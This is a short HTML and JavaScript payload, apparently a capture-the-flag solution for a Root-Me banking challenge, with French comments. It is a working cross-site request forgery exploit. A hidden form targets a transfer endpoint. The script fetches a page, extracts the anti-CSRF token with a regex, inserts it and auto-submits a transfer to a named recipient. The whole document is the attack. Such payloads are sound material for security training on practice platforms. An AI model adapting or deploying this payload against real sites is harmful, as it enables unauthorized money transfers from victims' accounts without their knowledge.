<form action="https://bankme-1.challenges.pro.root-me.org/transfer/" method="post" id="csrf-form">
  <input type="hidden" name="recipient" value="tarnaud_empire">
  <input type="hidden" name="amount" value="1">
  <input type="hidden" name="csrf-token" id="csrf-token" value="">
</form>

<script>
  // Récupération du jeton CSRF
  const xhttp = new XMLHttpRequest();
  xhttp.open("GET", "https://bankme-1.challenges.pro.root-me.org/page_avec_token", false);
  xhttp.send();

  // Extraction du jeton depuis la réponse
  const token = xhttp.responseText.match(/[a-f0-9]{32}/)[0];

  // Ajout du jeton dans le formulaire
  document.getElementById('csrf-token').setAttribute('value', token);

  // Envoi automatique du formulaire
  document.getElementById('csrf-form').submit();
</script>
